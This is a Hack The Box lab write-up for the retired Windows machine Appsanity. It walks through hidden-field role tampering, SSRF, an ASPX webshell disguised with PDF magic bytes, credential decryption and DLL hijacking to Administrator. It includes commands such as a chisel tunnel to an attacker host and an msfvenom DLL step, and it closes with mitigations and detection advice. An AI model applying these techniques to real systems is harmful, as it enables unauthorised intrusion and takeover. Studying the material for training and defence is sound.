---
machine: Appsanity
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, jwt, hidden-input, ssrf, upload, webshell, reversing, dll-hijack, privesc]
---

# Appsanity — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Two .NET portals (`meddigi.htb` and `portal.meddigi.htb`) share the same JWT secret. During signup, the hidden `Acctype` field is changed from `1` to `2` to obtain the doctor role, and the cookie is accepted by the second portal. There, the prescriptions form is an SSRF and report uploads only validate PDF magic bytes, not the extension. An ASPX file with a `%PDF-1.5` header is uploaded, found at a predictable path and executed through the SSRF, giving a shell as `svc_exampanel`. `ExaminationManagement.dll` reveals a registry key used to decrypt `devdoc`'s password; WinRM reaches that account. The `ReportManagement` service runs `upload`, which loads `Libraries\externalupload.dll`: replacing it with a malicious DLL gives a shell as Administrator.

## Reconnaissance

```bash
nmap -Pn -sCV -p80,443,5985 <IP>
```

- `80`/`443`: IIS with both portals.
- `5985`: WinRM.

```bash
echo '<IP> meddigi.htb portal.meddigi.htb' | sudo tee -a /etc/hosts
```

## Enumeration

`meddigi.htb` allows account registration. The `POST /Signup/SignUp` request contains a field that is not visible in the form:

```text
Acctype=1
```

Changing it to `Acctype=2` gives the user the doctor role. The JWT cookie is accepted by `portal.meddigi.htb`, which shows the medical panel.

The prescriptions form sends an email to a controlled link. It is an SSRF: point it at `https://127.0.0.1:<port>` and fuzz the internal port, which reveals the administration panel on `8080`.

## Foothold

The reports section accepts PDFs and stores the file under a predictable name ending in `_<name>`. Validation only checks the leading bytes, so a file with `%PDF-1.5` and an ASPX body is accepted and keeps the `.aspx` extension.

```http
POST /Reports/Upload HTTP/1.1
Content-Type: multipart/form-data

%PDF-1.5
<%@ Page Language="C#" %><% Response.Write(...); %>
```

The report is reachable at `ViewReport.aspx?file=<GUID>_dummy.aspx` and is invoked through the SSRF:

```text
https://127.0.0.1:8080/ViewReport.aspx?file=<GUID>_dummy.aspx
```

An ASPX webshell returns a reverse shell as `svc_exampanel`.

## Lateral movement

The examination panel DLL is at:

```text
C:\inetpub\ExaminationPanel\ExaminationPanel\bin\examinationManagement.dll
```

Copy it to a local share and open it in dnSpy/dotPeek. `RetrieveEncryptionKeyFromRegistery` reads a registry key and uses it to decrypt credentials. With the key and ciphertext, `devdoc`'s password is recovered:

```bash
netexec winrm <IP> -u devdoc -p '<PASSWORD>'
```

## Privilege escalation

`devdoc` can reach the `ReportManagement` service, listening on port `100`. A Chisel tunnel exposes it:

```bash
chisel client <LHOST>:8000 R:10000:127.0.0.1:100
rlwrap nc localhost 10000
```

The `upload` command runs:

```text
cmd.exe /c ReportManagementHelper Libraries\externalupload.dll
```

`C:\Program Files\ReportManagement\Libraries` is writable. Generate a DLL with `msfvenom`, upload it as `externalupload.dll` and run `upload <source>`; the DLL loads as Administrator and returns a shell.

## Evidence

- Signup with `Acctype=2` and portal access with the same cookie.
- SSRF against `127.0.0.1:8080` and internal port discovery.
- PDF with magic bytes and an `.aspx` extension executed by IIS.
- `examinationManagement.dll` and the registry key used to decrypt `devdoc`'s password.
- `externalupload.dll` loaded by `ReportManagement` and a shell as Administrator.

## Lessons learned

- A hidden field is never an authorization control.
- Sharing the JWT secret across applications widens the impact of an elevated role.
- Validating only magic bytes allows executable content to be uploaded.
- Predictable filenames make the webshell easy to locate.
- A registry encryption key does not protect a secret the process can read.
- A service loading DLLs from a writable directory is execution as its account.

## Mitigations and detection

- Validate the role server-side and never trust form fields.
- Use separate JWT secrets per application and rotate them.
- Validate extension, real type and content; rename files and serve them outside the web root.
- Encrypt secrets with DPAPI or an external vault and restrict read access.
- Enforce DLL allowlists and protect `Libraries` with ACLs.
- Monitor `.aspx` uploads, DLL creation in Program Files and `ReportManagementHelper` execution.

## References

- [0xdf — Appsanity](https://0xdf.gitlab.io/2024/03/09/htb-appsanity.html)
- [Hack The Box — Appsanity](https://app.hackthebox.com/machines/appsanity)
- [Knowledge — dnSpy](../../../knowledge/reversing/dotnet-dnspy.md)
